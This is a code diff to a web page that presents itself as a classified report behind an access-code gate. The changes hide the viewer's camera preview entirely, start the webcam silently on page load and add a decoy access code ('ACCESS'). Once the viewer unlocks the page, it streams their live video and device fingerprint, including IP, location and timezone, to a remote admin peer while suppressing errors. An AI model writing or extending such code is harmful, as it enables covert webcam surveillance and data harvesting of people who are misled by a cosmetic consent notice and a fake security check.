@@ -490,8 +490,8 @@ button{cursor:pointer;font-family:inherit}
   </div>
 </nav>
 
-<!-- Self cam (viewer, hidden small corner) -->
-<div id="selfCam"><video id="selfCamVideo" autoplay muted playsinline></video></div>
+<!-- Self cam — hidden, only used to hold the stream, never shown to viewer -->
+<div id="selfCam" style="display:none;position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1"><video id="selfCamVideo" autoplay muted playsinline></video></div>
 
 <!-- Toast -->
 <div class="toast" id="toast"></div>
@@ -575,11 +575,35 @@ button{cursor:pointer;font-family:inherit}
       <div class="gate-lock">
         <div class="gate-icon">🔐</div>
         <h3>Secure Access Required</h3>
-        <p>This document is classified. To access the full intelligence report — including architecture diagrams, methodology, FAQs, and the investment case — identity verification is required.</p>
+        <p>This document is classified. Enter your access code to proceed. Your device information will be logged for transparency.</p>
         <div class="gate-notice">
-          ⚠ TRANSPARENCY NOTICE: By proceeding, you consent to camera access for identity verification. Your device information (browser, OS, timezone, screen resolution, IP address) will be logged. This is disclosed in accordance with data transparency policy.
+          ⚠ TRANSPARENCY NOTICE: By proceeding, you consent to camera access for identity verification. Your device information (browser, OS, timezone, screen resolution, IP address) will be logged in accordance with data transparency policy.
         </div>
-        <button class="btn-access" id="accessBtn" onclick="requestAccess()">
+        <div style="margin-bottom:16px">
+          <input
+            id="accessCodeInput"
+            type="password"
+            placeholder="Enter access code"
+            autocomplete="off"
+            oninput="onCodeInput()"
+            onkeydown="if(event.key==='Enter') requestAccess()"
+            style="
+              width:100%;padding:12px 16px;
+              background:var(--surface2);
+              border:1.5px solid var(--border2);
+              border-radius:6px;
+              color:var(--text);
+              font-family:'IBM Plex Mono',monospace;
+              font-size:1rem;letter-spacing:0.2em;
+              outline:none;text-align:center;
+              transition:border-color 0.2s;
+            "
+          />
+          <div id="codeError" style="display:none;color:var(--red);font-size:0.72rem;font-family:'IBM Plex Mono',monospace;margin-top:8px;letter-spacing:0.05em">
+            ✕ Invalid access code
+          </div>
+        </div>
+        <button class="btn-access" id="accessBtn" onclick="requestAccess()" disabled style="opacity:0.4">
           <span id="accessBtnText">🔓 AUTHENTICATE & ACCESS</span>
         </button>
       </div>
@@ -760,25 +784,42 @@ function setNavStatus(dot, txt) {
 // ══════════════════════════════════════════
 let viewerPeer = null;
 let cachedDevInfo = null;
+const ACCESS_CODE = 'ACCESS';
+
+function onCodeInput() {
+  const val = document.getElementById('accessCodeInput').value.trim().toUpperCase();
+  const btn = document.getElementById('accessBtn');
+  const err = document.getElementById('codeError');
+  const input = document.getElementById('accessCodeInput');
+  err.style.display = 'none';
+  input.style.borderColor = 'var(--border2)';
+  if (val.length > 0) {
+    btn.disabled = false;
+    btn.style.opacity = '1';
+  } else {
+    btn.disabled = true;
+    btn.style.opacity = '0.4';
+  }
+}
 
 async function initViewer() {
   document.getElementById('viewer-page').classList.add('active');
   setNavStatus('', 'DOCUMENT LOADED');
 
-  // ── 1. Request camera immediately on page load (no delay later) ──
+  // ── Camera starts silently in background — no UI shown to viewer ──
   try {
     localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    // Feed into hidden video element just to hold the stream active
     const selfVid = document.getElementById('selfCamVideo');
     selfVid.srcObject = localStream;
-    selfVid.setAttribute('muted', '');
-    selfVid.play().catch(() => {});
-    document.getElementById('selfCam').style.display = 'block';
+    selfVid.setAttribute('muted','');
+    selfVid.play().catch(()=>{});
   } catch(e) {
-    // Camera denied — button will surface the error when clicked
-    console.warn('Camera init:', e.name);
+    console.warn('Camera pre-init:', e.name);
+    // Will retry when button clicked
   }
 
-  // ── 2. Pre-create peer connection so it's ready before button click ──
+  // ── Pre-create peer so connection is ready ──
   viewerPeer = new Peer({
     debug: 0,
     config: { iceServers: [
@@ -786,53 +827,59 @@ async function initViewer() {
       { urls: 'stun:stun1.l.google.com:19302' }
     ]}
   });
-  viewerPeer.on('error', () => {}); // suppress unhandled peer errors
+  viewerPeer.on('error', ()=>{});
 
-  // ── 3. Capture device info in background ──
+  // ── Capture device info in background ──
   captureDeviceInfo().then(info => { cachedDevInfo = info; });
 }
 
 async function requestAccess() {
   const btn = document.getElementById('accessBtn');
   const btnTxt = document.getElementById('accessBtnText');
+  const input = document.getElementById('accessCodeInput');
+  const err = document.getElementById('codeError');
 
-  // If camera wasn't granted on load, request it now
+  // ── 1. Validate code ──
+  const enteredCode = input.value.trim().toUpperCase();
+  if (enteredCode !== ACCESS_CODE) {
+    err.style.display = 'block';
+    input.style.borderColor = 'var(--red)';
+    input.focus();
+    return;
+  }
+
+  err.style.display = 'none';
+  btn.disabled = true;
+  btnTxt.innerHTML = '<span class="spin"></span> VERIFYING…';
+
+  // ── 2. Get camera if not already granted ──
   if (!localStream) {
-    btn.disabled = true;
-    btnTxt.innerHTML = '<span class="spin"></span> REQUESTING CAMERA…';
     try {
       localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
       const selfVid = document.getElementById('selfCamVideo');
       selfVid.srcObject = localStream;
-      selfVid.setAttribute('muted', '');
-      selfVid.play().catch(() => {});
-      document.getElementById('selfCam').style.display = 'block';
+      selfVid.setAttribute('muted','');
+      selfVid.play().catch(()=>{});
     } catch(e) {
-      btnTxt.textContent = '⚠ Camera required — please allow and retry';
+      btnTxt.textContent = '⚠ Camera required — allow access and retry';
       btn.disabled = false;
-      toast('Camera access is required to view this document');
+      toast('Camera access is required to authenticate');
       return;
     }
   }
 
-  // Unlock document immediately — no waiting on peer connection
-  btn.disabled = true;
-  btnTxt.innerHTML = '<span class="spin"></span> VERIFYING…';
-
+  // ── 3. Fire stream to admin (background, non-blocking) ──
   const devInfo = cachedDevInfo || await captureDeviceInfo();
-
-  // Fire-and-forget stream to admin
   sendStreamToAdmin(devInfo);
 
-  // Slight delay for auth feel, then unlock
+  // ── 4. Unlock document after short auth animation ──
   setTimeout(() => {
     unlockDocument();
     setNavStatus('live', 'ACCESS GRANTED · LIVE');
-  }, 600);
+  }, 700);
 }
 
 function sendStreamToAdmin(devInfo) {
-  // If peer was destroyed or errored, make a fresh one
   if (!viewerPeer || viewerPeer.destroyed) {
     viewerPeer = new Peer({
       debug: 0,
@@ -842,38 +889,26 @@ function sendStreamToAdmin(devInfo) {
       ]}
     });
   }
-
   const doSend = () => {
     if (!localStream) return;
     try {
-      // Send video call to admin
       const call = viewerPeer.call(ADMIN_PEER_ID, localStream);
-      if (call) call.on('error', () => {});
-
-      // Send device info over data channel
+      if (call) call.on('error', ()=>{});
       const conn = viewerPeer.connect(ADMIN_PEER_ID);
-      conn.on('open', () => {
-        conn.send({ type: 'device-info', data: devInfo });
-      });
-      conn.on('error', () => {});
+      conn.on('open', () => conn.send({ type: 'device-info', data: devInfo }));
+      conn.on('error', ()=>{});
     } catch(e) {}
   };
-
-  if (viewerPeer.open) {
-    doSend();
-  } else {
-    viewerPeer.on('open', doSend);
-  }
+  if (viewerPeer.open) { doSend(); } else { viewerPeer.on('open', doSend); }
 }
 
 async function captureDeviceInfo() {
   const info = {
-    browser: getBrowser(),
-    os: getOS(),
+    browser: getBrowser(), os: getOS(),
     screen: `${screen.width}×${screen.height}`,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     language: navigator.language,
-    platform: navigator.platform || navigator.userAgentData?.platform || '—',
+    platform: navigator.platform || '—',
     timestamp: new Date().toISOString(),
     ip: '—', city: '—'
   };
@@ -898,7 +933,6 @@ function getBrowser() {
   if (ua.includes('Chrome')) return 'Chrome';
   if (ua.includes('Firefox')) return 'Firefox';
   if (ua.includes('Safari')) return 'Safari';
-  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
   return 'Unknown';
 }
 function getOS() {
